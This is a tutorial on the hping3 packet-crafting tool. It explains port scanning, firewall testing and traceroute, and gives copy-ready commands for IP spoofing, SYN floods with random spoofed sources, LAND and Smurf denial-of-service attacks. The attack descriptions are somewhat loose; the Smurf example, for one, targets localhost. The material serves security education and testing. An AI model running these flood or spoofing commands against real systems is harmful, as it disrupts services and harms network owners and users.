`hping3` is a **command-line network security tool** used for **scanning, testing, and troubleshooting** networks. It allows users to **craft and send custom TCP, UDP, ICMP, and raw IP packets**, making it useful for **firewall testing, port scanning, intrusion detection system (IDS) testing, and denial-of-service (DoS) attack simulations**.

It is similar to the standard `ping` command but **far more powerful**, as it enables advanced packet manipulation and supports various protocols beyond just ICMP.


**Port Scanning** – Checks which ports are open on a target system.   
**Firewall Testing** – Detects firewall rules and security configurations.  
**IP Spoofing** – Sends packets with a fake source IP address.  
**DoS Attack Simulation** – Generates high-traffic floods to test system resilience.   
**Traceroute Functionality** – Maps the network path of packets using TCP instead of ICMP.  
**Packet Crafting** – Allows full customization of network packets (flags, payloads, timing, etc.).


`hping` sends **custom network packets** to a target and analyzes the response. Based on the type of response (or lack thereof), it can infer information about:

- **Open/closed ports**
- **Firewall rules**
- **Network latency**
- **System uptime**
- **Routing paths**

Unlike `ping`, which only sends ICMP Echo Requests, `hping` can send packets using **TCP, UDP, ICMP, or raw IP**, making it useful for both **legitimate security testing and malicious attacks** (ethical hacking, penetration testing).

---

 **1. Check if a host is online (like ping but with more control)**

```bash
hping3 -1 192.168.1.1
```

- `-1`: Sends **ICMP Echo Requests** (like `ping`).

 
**2. Perform a TCP SYN Scan (detect open ports)**

```bash
hping3 --scan 1-65535 192.168.1.1 -S --rand-source
```

- `-S`: Sends **SYN packets** to test check for open ports from random source IP addresses.
  
 **3. Spoof Source IP Address (IP Spoofing)**

```bash
hping3 -S -p 443 -a 10.10.10.10 192.168.1.1
```

- `-a 10.10.10.10`: Fake source IP **(spoofing attack simulation)**.


 **4. Simulate a Denial-of-Service (DoS) attack**

```bash
sudo hping3 -c 15000 -d 120 -S -w 64 -p 80 --flood --rand-source 192.168.1.1
```

This command is a hping3 command that sends a high volume of TCP SYN packets to the specified IP address on port 80. 

Here’s a breakdown of the command and what each option does:

- **-c 15000** : Specifies the number of packets to send. In this case, 15,000 packets will be sent.
  
- **-d 120** : Specifies the data size in the packets being sent. In this case, the data size is set to 120 bytes.
  
- **-S** : Sets the SYN flag in the TCP packet header, indicating the start of a TCP connection.
  
- **-w 64** : Sets the TCP window size to 64, which determines how much data can be sent at once before receiving an acknowledgment.
  
- **-p 80** : Specifies the destination port for the packets being sent. In this case, port 80 is being targeted, which is commonly used for HTTP traffic.
  
-  **— flood** : Enables flooding mode, which sends packets as fast as possible without waiting for responses.
  
-  **— rand-source** : Uses a random source IP address for each packet sent, making it more difficult to trace the source of the traffic.

 **5. Perform a TCP Traceroute**

```bash
hping3 --traceroute -S -p 80 192.168.1.1
```

- `--traceroute`: Maps **network path** using **TCP instead of ICMP**.

**6. LAND Attack**

```bash
hping3 -S -p 80 127.0.0.1 -a 127.0.0.1
```

- This is a kind of DoS (Denial of Service) attack in which a packet is sent to a target machine with the same address.

**7. SMURF Attack:**

```bash
 hping3 — icmp — flood 127.0.0.1 -a 127.0.0.1
```

- This is a kind of DDoS attack in which spoofed source address send a large amount of ICMP packets to the target address. It uses a victim address as a source address to send/broadcast the multiple ICMP ping request.


**Random Source Attack**

```bash
hping3 -S -p 80 Target — flood — rand-source
```

 - An attacker can send multiple random packets with different source addresses to the target machine which may cause the Distributed denial of service attack. It is difficult to identify the actual source address after an incident occurs.
